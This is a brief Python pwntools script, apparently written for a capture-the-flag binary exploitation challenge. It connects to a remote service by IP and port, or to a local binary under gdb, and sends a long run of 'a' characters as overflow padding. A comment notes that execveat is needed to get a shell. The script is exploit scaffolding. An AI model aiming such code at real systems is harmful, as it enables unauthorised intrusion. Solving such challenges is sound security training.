from pwn import*
context.arch="amd64"
import shutil

# This resolves the absolute path (e.g., /usr/bin/kitty) and tricks pwntools into ignoring it
context.terminal = [shutil.which('kitty'), 'sh', '-c']
b="./main"
#l = libc = ELF("./libc.so.6")
elf = e = context.binary = ELF(b)
DEBUG=0 # 0 remote , 1 local , 2 local + gdb
nc="nc 20.199.16.42 20057"
r=nc.split(" ")
if DEBUG==1:
    p=process(b)
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,"""
    b* vuln + 51 
    c
    """)
    pause()
else:
    p=remote(r[1],int(r[2]),ssl=False)


p.sendline("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa") 
# \n counts btw  , and we need to call execveat cz of paramters not execve
p.interactive()
